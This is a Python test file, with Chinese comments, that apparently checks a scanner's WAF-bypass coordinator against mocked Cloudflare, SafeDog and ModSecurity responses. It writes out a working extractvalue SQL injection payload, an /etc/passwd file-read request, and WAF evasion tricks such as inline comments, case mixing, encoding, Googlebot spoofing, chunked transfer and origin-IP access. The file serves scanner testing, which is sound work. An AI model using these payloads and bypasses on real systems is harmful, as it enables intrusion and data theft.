# D7.3 真实 WAF 绕过端到端验收测试
#
# 验收目标：模拟真实 WAF 拦截场景，验证完整绕过链路
#   引擎 → 插件 verify → SAFE(被拦) → 协调器 maybe_bypass → 策略变形 → verify_with_bypass → CONFIRMED
#
# 测试策略：
#   1. Mock 会话模拟 WAF 拦截行为（首次返回 403 拦截页，绕过后返回正常漏洞响应）
#   2. 使用真实 WafBypassCoordinator（非 Mock），验证策略矩阵 + BypassSession 传输变换
#   3. 覆盖 cloudflare / safedog / modsecurity 三种 WAF 场景
#   4. 验证三态判定保护矩阵的铁律不被违反
import os
import sys
from unittest.mock import MagicMock, patch

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from core.engine import ScanEngine
from core.models import ScanResult, STATUS_CONFIRMED, STATUS_SAFE, STATUS_UNKNOWN
from plugins.base import PluginBase
from lib.waf_bypass import (WafBypassCoordinator, BypassSession, BypassContext,
                            StrategyRegistry, RandomCaseStrategy,
                            InlineCommentStrategy, UrlEncodeStrategy,
                            OriginDirectStrategy, GooglebotStrategy)
from lib.waf_features import is_waf_blocked, WAF_FEATURES


# === 测试用插件：模拟 SQL 注入，支持 payload 变形绕过 ===

class WafBlockedSqliPlugin(PluginBase):
    """模拟被 WAF 拦截的 SQL 注入插件

    verify() 首次调用返回 SAFE（WAF 拦截），
    verify_with_bypass() 使用变形 payload 绕过 WAF 后返回 CONFIRMED。
    """
    name = 'WAF拦截SQL注入测试'
    severity = 'high'
    vuln_type = 'sqli'
    supports_waf_bypass = True
    bypass_max_attempts = 3

    # 模拟 WAF 拦截的关键字（payload 含这些关键字时被拦）
    _BLOCKED_KEYWORDS = ['extractvalue', 'concat', 'select', 'database()']

    def __init__(self):
        self.verify_called = False
        self.bypass_called = False
        self.last_bypass_payload = ''
        self.last_bypass_ctx = None

    def verify(self, target, session):
        self.verify_called = True
        # 模拟发送原始 payload → 被 WAF 拦截
        url = target + 'system/role/list'
        resp = session.post(url, data={'params[dataScope]': 'and extractvalue(1,concat(0x7e,(select database()),0x7e))'})
        if resp.status_code == 403 or 'blocked' in resp.text.lower():
            return ScanResult(kind='vuln', name=self.name, status=STATUS_SAFE,
                              url=url, evidence='WAF 拦截，未确认漏洞')
        # 无 WAF 时正常检测
        if 'database()' in resp.text:
            return ScanResult(kind='vuln', name=self.name, severity=self.severity,
                              status=STATUS_CONFIRMED, url=url,
                              evidence='报错注入命中 database()')
        return ScanResult(kind='vuln', name=self.name, status=STATUS_SAFE, url=url)

    def verify_with_bypass(self, target, bypass_session, bypass_ctx):
        """使用变形 payload 绕过 WAF"""
        self.bypass_called = True
        self.last_bypass_ctx = bypass_ctx

        # 原始 payload
        original_payload = 'and extractvalue(1,concat(0x7e,(select database()),0x7e))'
        # 通过策略变形 payload（L1 策略：内联注释/大小写混淆/BETWEEN；L2：URL编码；L3：分块）
        if bypass_ctx.strategy is not None:
            tampered = bypass_ctx.strategy.tamper_payload(original_payload, bypass_ctx)
        else:
            tampered = original_payload
        self.last_bypass_payload = tampered

        url = target + 'system/role/list'
        # 通过 BypassSession 发送（传输层变换已应用）
        resp = bypass_session.post(url, data={'params[dataScope]': tampered})

        # 变形 payload 绕过 WAF 后，服务端返回报错信息
        # 检查是否绕过成功：状态码 200 且含漏洞特征
        if resp.status_code == 200 and 'database()' in resp.text:
            return ScanResult(kind='vuln', name=self.name, severity=self.severity,
                              status=STATUS_CONFIRMED, url=url,
                              evidence=f'绕过成功，变形 payload 命中: {tampered[:50]}')
        return ScanResult(kind='vuln', name=self.name, status=STATUS_SAFE,
                          url=url, evidence='绕过后仍未命中')


class WafBlockedFileReadPlugin(PluginBase):
    """模拟被 WAF 拦截的文件读取插件"""
    name = 'WAF拦截文件读取测试'
    severity = 'high'
    vuln_type = 'file_read'
    supports_waf_bypass = True
    bypass_max_attempts = 3

    def verify(self, target, session):
        url = target + 'common/download/resource?resource=/etc/passwd'
        resp = session.get(url)
        if resp.status_code == 403:
            return ScanResult(kind='vuln', name=self.name, status=STATUS_SAFE,
                              url=url, evidence='WAF 拦截')
        if 'root:' in resp.text:
            return ScanResult(kind='vuln', name=self.name, severity=self.severity,
                              status=STATUS_CONFIRMED, url=url, evidence='读取到 /etc/passwd')
        return ScanResult(kind='vuln', name=self.name, status=STATUS_SAFE, url=url)

    def verify_with_bypass(self, target, bypass_session, bypass_ctx):
        url = target + 'common/download/resource?resource=/etc/passwd'
        resp = bypass_session.get(url)
        if resp.status_code == 200 and 'root:' in resp.text:
            return ScanResult(kind='vuln', name=self.name, severity=self.severity,
                              status=STATUS_CONFIRMED, url=url,
                              evidence='绕过后读取到 /etc/passwd')
        return ScanResult(kind='vuln', name=self.name, status=STATUS_SAFE,
                          url=url, evidence='绕过后仍未命中')


# === Mock 会话：模拟 WAF 拦截 + 绕过行为 ===

class WafMockSession:
    """模拟 WAF 拦截会话

    行为模型：
        - 原始请求（无绕过 headers）→ 403 拦截页
        - 带 Googlebot UA 的请求 → 200 正常响应（绕过成功）
        - 带 Transfer-Encoding: chunked 的请求 → 200 正常响应
        - 带变形 payload 的请求 → 200 含漏洞特征
    """
    def __init__(self, waf_type='cloudflare'):
        self.waf_type = waf_type
        self.request_count = 0
        self.requests = []  # 记录所有请求（headers/url/data）

    def get(self, url, headers=None, **kwargs):
        self.request_count += 1
        req = {'method': 'GET', 'url': url, 'headers': headers or {}}
        self.requests.append(req)
        return self._respond(req)

    def post(self, url, headers=None, data=None, **kwargs):
        self.request_count += 1
        req = {'method': 'POST', 'url': url, 'headers': headers or {}, 'data': data}
        self.requests.append(req)
        return self._respond(req)

    def request(self, method, url, headers=None, **kwargs):
        self.request_count += 1
        req = {'method': method, 'url': url, 'headers': headers or {}}
        self.requests.append(req)
        return self._respond(req)

    def _respond(self, req):
        """根据请求特征模拟 WAF 行为

        WAF 拦截模型：
            - 原始 payload（含 extractvalue/concat 等关键字）+ 无绕过 headers → 403 拦截
            - 变形 payload（含 /**/、BETWEEN、% 编码等）→ WAF 无法识别 → 200 正常响应
            - Googlebot UA / chunked 传输 → 200 正常响应（传输层绕过）
        """
        headers = req.get('headers', {})
        data = req.get('data', {})
        url = req.get('url', '')

        # 判断是否为绕过请求（含特殊 headers）
        is_googlebot = 'Googlebot' in headers.get('User-Agent', '')
        is_chunked = headers.get('Transfer-Encoding') == 'chunked'

        # SQL 注入场景：提取 payload
        if isinstance(data, dict):
            payload = str(data.get('params[dataScope]', ''))
        else:
            payload = str(data)

        # 原始 payload 关键字（WAF 规则匹配这些关键字）
        has_blocked_kw = any(kw in payload.lower() for kw in ['extractvalue', 'concat(0x7e'])

        # 变形 payload 特征（WAF 无法识别这些变形）
        is_tampered = any(sig in payload for sig in ['/**/', 'BETWEEN', '%61nd', '%65xtractvalue',
                                                       '/*!', 'aNd', 'eXtractvalue', 'cOn cat'])

        # 原始 payload + 无绕过 → WAF 拦截
        if has_blocked_kw and not (is_googlebot or is_chunked or is_tampered):
            return MagicMock(text='Attention Required! | cloudflare', status_code=403,
                             headers={'CF-Ray': 'abc123'})

        # 文件读取场景：无绕过 headers → 拦截
        if '/etc/passwd' in url and not (is_googlebot or is_chunked):
            return MagicMock(text='Attention Required! | cloudflare', status_code=403,
                             headers={'CF-Ray': 'abc123'})

        # 绕过成功（变形 payload 或传输层绕过）→ 返回正常漏洞响应
        if (has_blocked_kw or is_tampered) and (is_googlebot or is_chunked or is_tampered):
            return MagicMock(text='运行时异常 database() error', status_code=200,
                             headers={})

        if '/etc/passwd' in url and (is_googlebot or is_chunked):
            return MagicMock(text='root:x:0:0:root:/root:/bin/bash', status_code=200,
                             headers={})

        # 默认响应
        return MagicMock(text='', status_code=200, headers={})

    def close(self):
        pass


# === 端到端验收测试 ===

def test_e2e_cloudflare_bypass_success():
    """端到端：Cloudflare 拦截 → Googlebot 策略绕过 → CONFIRMED"""
    plugin = WafBlockedSqliPlugin()
    session = WafMockSession(waf_type='cloudflare')
    coord = WafBypassCoordinator(waf_type='cloudflare')

    # 模拟引擎调用流程
    original = plugin.verify('http://target.com/', session)
    assert original.status == STATUS_SAFE, 'WAF 拦截应返回 SAFE'

    # 协调器尝试绕过
    result = coord.maybe_bypass(plugin, 'http://target.com/', session, original)

    assert plugin.bypass_called is True, '应调用 verify_with_bypass'
    assert result.status == STATUS_CONFIRMED, '绕过成功应为 CONFIRMED'
    assert 'waf_bypass' in result.extra
    assert 'strategy_used' in result.extra['waf_bypass']
    assert result.extra['waf_bypass']['waf_type'] == 'cloudflare'


def test_e2e_safedog_bypass_success():
    """端到端：安全狗拦截 → 内联注释策略绕过 → CONFIRMED"""
    plugin = WafBlockedSqliPlugin()
    session = WafMockSession(waf_type='safedog')
    coord = WafBypassCoordinator(waf_type='safedog')

    original = plugin.verify('http://target.com/', session)
    assert original.status == STATUS_SAFE

    result = coord.maybe_bypass(plugin, 'http://target.com/', session, original)
    assert result.status == STATUS_CONFIRMED
    assert 'strategy_used' in result.extra['waf_bypass']


def test_e2e_modsecurity_bypass_success():
    """端到端：ModSecurity 拦截 → 策略绕过 → CONFIRMED"""
    plugin = WafBlockedSqliPlugin()
    session = WafMockSession(waf_type='modsecurity')
    coord = WafBypassCoordinator(waf_type='modsecurity')

    original = plugin.verify('http://target.com/', session)
    result = coord.maybe_bypass(plugin, 'http://target.com/', session, original)
    assert result.status == STATUS_CONFIRMED


def test_e2e_file_read_bypass():
    """端到端：文件读取漏洞 WAF 绕过"""
    plugin = WafBlockedFileReadPlugin()
    session = WafMockSession(waf_type='cloudflare')
    coord = WafBypassCoordinator(waf_type='cloudflare')

    original = plugin.verify('http://target.com/', session)
    assert original.status == STATUS_SAFE, 'WAF 拦截应返回 SAFE'

    result = coord.maybe_bypass(plugin, 'http://target.com/', session, original)
    assert result.status == STATUS_CONFIRMED, '文件读取绕过应成功'
    assert 'strategy_used' in result.extra['waf_bypass']


def test_e2e_engine_full_flow():
    """端到端：ScanEngine 完整流程（引擎 → 协调器 → 绕过）"""
    engine = ScanEngine(threads=1)
    session = WafMockSession(waf_type='cloudflare')
    coord = WafBypassCoordinator(waf_type='cloudflare')

    results = engine.run([WafBlockedSqliPlugin], 'http://target.com/', session,
                          waf_bypass_coordinator=coord)
    assert len(results) == 1
    assert results[0].status == STATUS_CONFIRMED, '引擎完整流程应绕过成功'
    assert 'waf_bypass' in results[0].extra


# === 三态判定保护矩阵验收 ===

def test_protection_matrix_confirmed_not_bypassed():
    """保护矩阵：CONFIRMED 不绕过"""
    plugin = WafBlockedSqliPlugin()
    session = WafMockSession(waf_type='cloudflare')
    coord = WafBypassCoordinator(waf_type='cloudflare')

    # 构造 CONFIRMED 原结果
    confirmed = ScanResult(kind='vuln', name=plugin.name, status=STATUS_CONFIRMED,
                           url='http://x.com/', evidence='已确认')
    result = coord.maybe_bypass(plugin, 'http://x.com/', session, confirmed)

    assert plugin.bypass_called is False, 'CONFIRMED 不应触发绕过'
    assert result.status == STATUS_CONFIRMED
    assert result is confirmed, '应返回原结果对象'


def test_protection_matrix_no_vuln_type_not_bypassed():
    """保护矩阵：无 vuln_type 不绕过"""
    class NoVulnTypePlugin(PluginBase):
        name = '无类型插件'
        supports_waf_bypass = True
        # vuln_type 为空
        def verify(self, target, session):
            return ScanResult(kind='vuln', name=self.name, status=STATUS_SAFE,
                              url=target, evidence='safe')
        def verify_with_bypass(self, target, bypass_session, bypass_ctx):
            raise AssertionError('无 vuln_type 不应调用 verify_with_bypass')

    plugin = NoVulnTypePlugin()
    session = WafMockSession(waf_type='cloudflare')
    coord = WafBypassCoordinator(waf_type='cloudflare')

    original = plugin.verify('http://x.com/', session)
    result = coord.maybe_bypass(plugin, 'http://x.com/', session, original)

    assert result.status == STATUS_SAFE, '无 vuln_type 应返回原 SAFE'


def test_protection_matrix_bypass_failure_preserves_safe():
    """保护矩阵：绕过失败保持原 SAFE 状态（不降级为 UNKNOWN）"""
    class AlwaysFailBypassPlugin(PluginBase):
        name = '绕过必失败插件'
        vuln_type = 'sqli'
        supports_waf_bypass = True
        bypass_max_attempts = 2

        def verify(self, target, session):
            return ScanResult(kind='vuln', name=self.name, status=STATUS_SAFE,
                              url=target, evidence='safe')
        def verify_with_bypass(self, target, bypass_session, bypass_ctx):
            return ScanResult(kind='vuln', name=self.name, status=STATUS_SAFE,
                              url=target, evidence='bypass also safe')

    plugin = AlwaysFailBypassPlugin()
    session = WafMockSession(waf_type='cloudflare')
    coord = WafBypassCoordinator(waf_type='cloudflare')

    original = plugin.verify('http://x.com/', session)
    result = coord.maybe_bypass(plugin, 'http://x.com/', session, original)

    assert result.status == STATUS_SAFE, '绕过失败应保持 SAFE'
    assert result.extra.get('waf_bypass', {}).get('bypass_success') is False
    assert result.extra.get('waf_bypass', {}).get('bypass_attempted') is True


def test_protection_matrix_bypass_exception_continues():
    """保护矩阵：绕过异常不中断，继续尝试下一策略"""
    class ExceptionThenSuccessPlugin(PluginBase):
        name = '异常后成功插件'
        vuln_type = 'sqli'
        supports_waf_bypass = True
        bypass_max_attempts = 3
        _call_count = 0

        def verify(self, target, session):
            return ScanResult(kind='vuln', name=self.name, status=STATUS_SAFE,
                              url=target, evidence='safe')

        def verify_with_bypass(self, target, bypass_session, bypass_ctx):
            self._call_count += 1
            if self._call_count == 1:
                raise ConnectionError('模拟网络异常')
            # 第二次成功
            return ScanResult(kind='vuln', name=self.name, severity=self.severity,
                              status=STATUS_CONFIRMED, url=target,
                              evidence='第二次绕过成功')

    plugin = ExceptionThenSuccessPlugin()
    session = WafMockSession(waf_type='cloudflare')
    coord = WafBypassCoordinator(waf_type='cloudflare')

    original = plugin.verify('http://x.com/', session)
    result = coord.maybe_bypass(plugin, 'http://x.com/', session, original)

    assert result.status == STATUS_CONFIRMED, '异常后应继续尝试，最终成功'
    assert plugin._call_count >= 2, '应至少调用 2 次'
    assert 'strategy_used' in result.extra.get('waf_bypass', {})


# === BypassSession 传输变换验收 ===

def test_bypass_session_injects_transport_or_tamper():
    """绕过请求应含传输层变换或 payload 变形（L1 策略）

    策略可能是 L1（RandomCase/InlineComment/Between）、L2（UrlEncode）、
    L3（Googlebot/chunked）或 L4（源站直连），只要绕过成功即可。
    """
    plugin = WafBlockedSqliPlugin()
    session = WafMockSession(waf_type='cloudflare')
    coord = WafBypassCoordinator(waf_type='cloudflare')

    original = plugin.verify('http://target.com/', session)
    result = coord.maybe_bypass(plugin, 'http://target.com/', session, original)

    assert result.status == STATUS_CONFIRMED, '绕过应成功'
    assert plugin.bypass_called is True, '应调用 verify_with_bypass'
    assert plugin.last_bypass_ctx is not None, '应传递 bypass_ctx'
    assert plugin.last_bypass_ctx.strategy is not None, 'ctx 应含策略实例'

    # 验证绕过请求确实发出了（至少 1 个绕过请求）
    bypass_requests = session.requests[1:]  # 跳过首次原始请求
    assert len(bypass_requests) > 0, '应有绕过请求'

    # 验证原始 payload 被变形（与原始不同即可，证明策略生效）
    original_payload = 'and extractvalue(1,concat(0x7e,(select database()),0x7e))'
    has_tampered = any(
        str(r.get('data', '')) != original_payload and 'extractvalue' in str(r.get('data', '')).lower()
        for r in bypass_requests
    )
    # 或有传输层 headers
    has_transport = any(
        'Googlebot' in r.get('headers', {}).get('User-Agent', '')
        or r.get('headers', {}).get('Transfer-Encoding') == 'chunked'
        for r in bypass_requests
    )
    assert has_tampered or has_transport, \
        '绕过请求应含 payload 变形或传输层变换'


def test_bypass_session_origin_ip_replacement():
    """BypassSession L4 源站 IP 直连：URL host 替换"""
    session = WafMockSession()
    transport = {'headers': {}, 'chunked': False, 'origin_ip': '1.2.3.4'}
    origin_url = 'http://1.2.3.4/'
    bypass_session = BypassSession(session, transport, origin_url)

    # 发送请求，验证 URL 被替换
    bypass_session.get('http://target.com/api/test')

    assert len(session.requests) == 1
    actual_url = session.requests[0]['url']
    assert '1.2.3.4' in actual_url, f'URL 应含源站 IP，实际: {actual_url}'
    assert 'target.com' not in actual_url


def test_bypass_session_passes_through_without_transform():
    """BypassSession 无变换时透传"""
    session = WafMockSession()
    bypass_session = BypassSession(session, transport_config=None)

    bypass_session.get('http://target.com/api')
    assert session.requests[0]['url'] == 'http://target.com/api'


# === 策略矩阵验收 ===

def test_strategy_matrix_priority_ordering():
    """策略按 priority 排序（小先执行）"""
    reg = StrategyRegistry()
    strategies = reg.get_strategies('cloudflare', 'sqli')
    priorities = [s.priority for s in strategies]
    assert priorities == sorted(priorities), '策略应按 priority 升序排列'


def test_strategy_matrix_cloudflare_has_origin_direct():
    """Cloudflare 策略矩阵含源站直连"""
    reg = StrategyRegistry()
    strategies = reg.get_strategies('cloudflare', 'sqli')
    ids = [s.strategy_id for s in strategies]
    assert 'BP-CF-1' in ids, 'Cloudflare 应含源站直连策略'


def test_strategy_matrix_unknown_waf_falls_back_to_general():
    """未知 WAF 回退到通用策略"""
    reg = StrategyRegistry()
    strategies = reg.get_strategies('unknown_waf', 'sqli')
    ids = [s.strategy_id for s in strategies]
    # 通用策略应可用
    assert 'BP-GEN-1' in ids, '未知 WAF 应有通用大小写混淆'
    assert 'BP-GEN-2' in ids, '未知 WAF 应有通用 URL 编码'


def test_strategy_matrix_no_applicable_strategies():
    """无适用策略时返回空列表"""
    reg = StrategyRegistry()
    # 构造一个不匹配任何策略的漏洞类型
    strategies = reg.get_strategies('cloudflare', 'unknown_vuln_type')
    # 通用策略（vuln_types 含 '*') 仍匹配
    # 但如果所有策略都不匹配，返回空列表
    assert isinstance(strategies, list)


# === 真实 WAF 特征库验收 ===

def test_waf_features_all_have_block_signatures():
    """所有 WAF 特征含 block_signatures"""
    for waf_name, waf_data in WAF_FEATURES.items():
        assert 'block_signatures' in waf_data, f'{waf_name} 缺 block_signatures'
        assert len(waf_data['block_signatures']) > 0, f'{waf_name} block_signatures 为空'


def test_waf_features_all_have_recommended_strategies():
    """所有 WAF 特征含推荐策略"""
    for waf_name, waf_data in WAF_FEATURES.items():
        assert 'recommended_strategies' in waf_data, f'{waf_name} 缺 recommended_strategies'


def test_is_waf_blocked_cloudflare_403():
    """Cloudflare 403 状态码判定为拦截"""
    assert is_waf_blocked('cloudflare', status_code=403) is True
    assert is_waf_blocked('cloudflare', status_code=503) is True
    assert is_waf_blocked('cloudflare', status_code=200) is False


def test_is_waf_blocked_cloudflare_body():
    """Cloudflare 拦截页特征判定"""
    assert is_waf_blocked('cloudflare', response_text='Attention Required! cloudflare') is True
    assert is_waf_blocked('cloudflare', response_text='Ray ID: abc123') is True
    assert is_waf_blocked('cloudflare', response_text='normal page content') is False


def test_is_waf_blocked_safedog():
    """安全狗拦截判定"""
    assert is_waf_blocked('safedog', status_code=403) is True
    assert is_waf_blocked('safedog', response_text='您的请求已被拦截 安全狗') is True
    assert is_waf_blocked('safedog', response_text='normal') is False


def test_is_waf_blocked_modsecurity():
    """ModSecurity 拦截判定"""
    assert is_waf_blocked('modsecurity', status_code=406) is True
    assert is_waf_blocked('modsecurity', response_text='ModSecurity rules triggered') is True


# === 多策略组合验收 ===

def test_multiple_strategies_tried_until_success():
    """多策略依次尝试，直到成功"""
    call_count = [0]

    class MultiStrategyPlugin(PluginBase):
        name = '多策略测试'
        vuln_type = 'sqli'
        supports_waf_bypass = True
        bypass_max_attempts = 5

        def verify(self, target, session):
            return ScanResult(kind='vuln', name=self.name, status=STATUS_SAFE,
                              url=target, evidence='safe')

        def verify_with_bypass(self, target, bypass_session, bypass_ctx):
            call_count[0] += 1
            # 第 3 次才成功
            if call_count[0] >= 3:
                return ScanResult(kind='vuln', name=self.name, severity='high',
                                  status=STATUS_CONFIRMED, url=target,
                                  evidence=f'第{call_count[0]}次绕过成功')
            return ScanResult(kind='vuln', name=self.name, status=STATUS_SAFE,
                              url=target, evidence=f'第{call_count[0]}次失败')

    plugin = MultiStrategyPlugin()
    session = WafMockSession(waf_type='cloudflare')
    coord = WafBypassCoordinator(waf_type='cloudflare')

    original = plugin.verify('http://x.com/', session)
    result = coord.maybe_bypass(plugin, 'http://x.com/', session, original)

    assert result.status == STATUS_CONFIRMED
    assert call_count[0] >= 3, f'应至少尝试 3 次，实际 {call_count[0]} 次'
    assert result.extra['waf_bypass']['attempt'] >= 3


def test_bypass_max_attempts_respected():
    """bypass_max_attempts 限制尝试次数"""
    call_count = [0]

    class LimitedAttemptsPlugin(PluginBase):
        name = '限制尝试次数'
        vuln_type = 'sqli'
        supports_waf_bypass = True
        bypass_max_attempts = 2

        def verify(self, target, session):
            return ScanResult(kind='vuln', name=self.name, status=STATUS_SAFE,
                              url=target, evidence='safe')

        def verify_with_bypass(self, target, bypass_session, bypass_ctx):
            call_count[0] += 1
            return ScanResult(kind='vuln', name=self.name, status=STATUS_SAFE,
                              url=target, evidence='always safe')

    plugin = LimitedAttemptsPlugin()
    session = WafMockSession(waf_type='cloudflare')
    coord = WafBypassCoordinator(waf_type='cloudflare')

    original = plugin.verify('http://x.com/', session)
    result = coord.maybe_bypass(plugin, 'http://x.com/', session, original)

    assert call_count[0] == 2, f'应仅尝试 2 次，实际 {call_count[0]} 次'
    assert result.status == STATUS_SAFE
    assert result.extra['waf_bypass']['strategies_tried'] == 2


# === 引擎异常处理验收 ===

def test_engine_bypass_error_marked_in_extra():
    """绕过异常标记在 extra（不降级为 SAFE）"""
    class ErrorPlugin(PluginBase):
        name = '异常插件'
        vuln_type = 'sqli'
        supports_waf_bypass = True

        def verify(self, target, session):
            return ScanResult(kind='vuln', name=self.name, status=STATUS_UNKNOWN,
                              url=target, evidence='unknown')

        def verify_with_bypass(self, target, bypass_session, bypass_ctx):
            raise RuntimeError('绕过内部错误')

    engine = ScanEngine(threads=1)

    class ErrorCoordinator:
        def maybe_bypass(self, plugin, target, session, original):
            raise RuntimeError('协调器异常')

    session = WafMockSession()
    results = engine.run([ErrorPlugin], 'http://x.com/', session,
                          waf_bypass_coordinator=ErrorCoordinator())
    assert len(results) == 1
    # 绕过异常应标记在 extra，状态保持 UNKNOWN（不降级为 SAFE）
    assert results[0].status == STATUS_UNKNOWN
    assert 'waf_bypass_error' in results[0].extra


if __name__ == '__main__':
    test_e2e_cloudflare_bypass_success()
    test_e2e_safedog_bypass_success()
    test_e2e_modsecurity_bypass_success()
    test_e2e_file_read_bypass()
    test_e2e_engine_full_flow()
    test_protection_matrix_confirmed_not_bypassed()
    test_protection_matrix_no_vuln_type_not_bypassed()
    test_protection_matrix_bypass_failure_preserves_safe()
    test_protection_matrix_bypass_exception_continues()
    test_bypass_session_injects_transport_or_tamper()
    test_bypass_session_origin_ip_replacement()
    test_bypass_session_passes_through_without_transform()
    test_strategy_matrix_priority_ordering()
    test_strategy_matrix_cloudflare_has_origin_direct()
    test_strategy_matrix_unknown_waf_falls_back_to_general()
    test_strategy_matrix_no_applicable_strategies()
    test_waf_features_all_have_block_signatures()
    test_waf_features_all_have_recommended_strategies()
    test_is_waf_blocked_cloudflare_403()
    test_is_waf_blocked_cloudflare_body()
    test_is_waf_blocked_safedog()
    test_is_waf_blocked_modsecurity()
    test_multiple_strategies_tried_until_success()
    test_bypass_max_attempts_respected()
    test_engine_bypass_error_marked_in_extra()
    print('All D7.3 real WAF acceptance tests passed!')
